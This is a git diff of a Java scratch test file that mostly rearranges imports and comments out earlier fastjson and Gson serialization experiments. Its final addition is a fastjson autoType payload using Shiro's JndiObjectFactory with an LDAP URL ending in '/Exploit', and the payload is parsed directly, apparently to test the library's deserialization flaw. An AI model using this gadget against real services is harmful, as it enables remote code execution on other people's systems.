@@ -1,22 +1,22 @@
 package com.example.demo.java.test;
 
+import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
-import com.alibaba.fastjson.serializer.BigDecimalCodec;
+import com.alibaba.fastjson.serializer.JavaBeanSerializer;
 import com.alibaba.fastjson.serializer.SerializeConfig;
-import org.apache.commons.lang3.StringUtils;
+import com.google.gson.Gson;
 import org.springframework.scheduling.concurrent.CustomizableThreadFactory;
-import java.lang.reflect.Field;
-import java.util.Random;
-import java.util.concurrent.ConcurrentLinkedQueue;
-import java.util.concurrent.atomic.AtomicInteger;
-import java.util.regex.Pattern;
-import java.io.*;
+
+import java.io.InputStream;
+import java.io.Serializable;
 import java.math.BigDecimal;
-import java.util.*;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 import java.util.concurrent.*;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
-import java.util.stream.Collectors;
 
 /**
  * @author zhangtao
@@ -132,10 +132,51 @@ public class Test {
 //        t2.join();
 //        System.out.println(count);
 
-        List<T> ts = new ArrayList<>();
-        Map<String,String> map = ts.stream().collect(Collectors.toMap(t->t.getA().toString(),T::getB));
+//        List<T> ts = new ArrayList<>();
+//        Map<String,String> map = ts.stream().collect(Collectors.toMap(t->t.getA().toString(),T::getB));
+
+//        System.out.println((101<<3)+1);
+//        System.out.println((101<<3)+2);
+//        System.out.println((101<<3)+3);
+//        System.out.println((101<<3)+4);
+//        System.out.println((101<<3)+5);
+
+//        NamedList<String> list = new NamedList<>();
+//        list.add("1","zhangsan");
+//        list.add("2","lisi");
+//        System.out.println(JSON.toJSONString(list));
+
+//        SerializeConfig.getGlobalInstance().put(NamedList.class, MiscCodec.instance);
+//        SerializeConfig.getGlobalInstance().put(NamedList.Entry.class, new JavaBeanSerializer(NamedList.Entry.class));
+//        System.out.println(JSON.toJSONString(list));
+
+//        System.out.println(new Gson().toJson(list));
+
+//        Map<String,String> map = new HashMap<>();
+//        map.put("1","zhangsan");
+//        map.put("1","lisi");
+//        System.out.println(JSON.toJSONString(map));
+
+
+//        JSONObject responseData = new JSONObject();
+//        Integer status=1;
+//        List<Map<String,Object>> list=new ArrayList<>();
+//        Map<String, Object> map = new HashMap<>();
+//        map.put("file_type","auth_protocol");
+//        map.put("file_path","http");
+//        list.add(map);
+//        responseData.put("data",list);
+//        responseData.put("status",status);
+//        String s = JSONObject.toJSONString(responseData);
+//        TestResp testResp = JSON.parseObject(s, TestResp.class);
+//
+//        System.out.println(JSON.toJSONString(testResp));
+
+        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+        JSONObject.parseObject(payload);
     }
-    static class T{
+
+    static class T {
         private Integer a;
         private String b;
 
